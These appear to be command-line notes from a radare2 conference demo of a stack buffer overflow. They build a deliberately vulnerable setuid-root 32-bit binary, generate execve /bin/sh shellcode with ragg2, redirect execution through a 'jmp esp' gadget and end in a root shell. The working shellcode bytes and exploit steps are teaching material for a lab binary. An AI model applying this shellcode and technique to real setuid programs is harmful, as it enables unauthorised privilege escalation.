
// Enable ASLR
sudo bash -c 'echo 2 > /proc/sys/kernel/randomize_va_space'  

// Compile without stack-canaries
gcc -mpreferred-stack-boundary=2 simplebof.c -m32 -o simplebof -fno-stack-protector -z execstack


// Setuid the binary with root permissions
sudo chown root simplebof
sudo chmod +s simplebof


$  curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.32.0/install.sh | bash
$ export NVM_DIR="/home/dudu/.nvm"
$ [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
$ nvm install v6.7.0 
######################################################################## 100,0%
Computing checksum with sha256sum
Checksums matched!
Now using node v6.7.0 (npm v3.10.3)
Creating default alias: default -> v6.7.0


npm install r2pipe
git clone https://github.com/jpenalbae/chita.git
cd chita
npm install
chmod +x chita.js 
ln -s `pwd`/chita.js ~/.config/radare2/prefix/bin




$ vi ~/.config/radare2/radare2rc
# Alias
$decompile=#!pipe node $HOME/radare2/r2-scripts/decompiler/decompile.js
$chita=#!pipe node $HOME/radare2/r2-scripts/chita/chita.js



// Verify disabled flags: canary, nx & pie
rabin2 -I simplebof
pic      false
canary   false
nx       false
bintype  elf
class    ELF32
lang     c
arch     x86
bits     32
machine  Intel 80386


// debug the profile
r2 -e dbg.profile=profile.rarun2 -d simplebof     
	s sym.dummy
	af
	pdf
	db 0x080484a9             # 0x080484a9      c3             ret


// Generates shellcode  (buffer-64-bytes+ EBP + EIP)
ragg2 -b 32 -a x86 -z -p n2048 -d 68:0xffffc980 -i exec 
ragg2 -b 32 -a x86 -z -p n2048 -d 68:0xffffc9a0 -i exec 

// debug the exploit
r2 -e dbg.profile=exploit.rarun2 -d simplebof     
	s sym.dummy
	af
	pdf
	db 0x080484a9             # 0x080484a9      c3             ret	




$ r2 simplebof
 -- Emulate the base address of a file with e file.baddr.

[0x080487aa]> $chita 
Invalid command: undefined

Usage: #!pipe chita command [options]

Where valid commands are:
  pattern  Generate a pseudorandom text pattern
  rdbg     Generate a gdb or radare file to debug a ROP chain
  rop2c    Generate C/python code from ROP chain file
  fmt      Format string exploiting helper
  jmp      Search for instructions such as 'jmp esp' and so on
  pivot    Search for stack pivots
  info     Show executable info
  little   Convert hexstring to little endian
  help     Shows this help

Extended help: #!pipe chita [command] -h

[0x080487aa]> $chita jmp -r esp
This function might not work without keystone plugin installed
[*] hits for opcode: jmp esp
  - 0x804847e:  (.text) hit5_1 sym.trick R X 'jmp esp'




$ ragg2 -b 32 -a x86 -z -p n80 -d 68:0x804847e -i exec
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7e\x84\x04\x08\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80


$ ./exploit.rarun2 
Hello r2con
The argument is: ��������������������������������������������������������������������~���������1�Ph//shh/bin��PS�ᙰ

# id
uid=1000(dudu) gid=1000(dudu) euid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),1000(dudu)

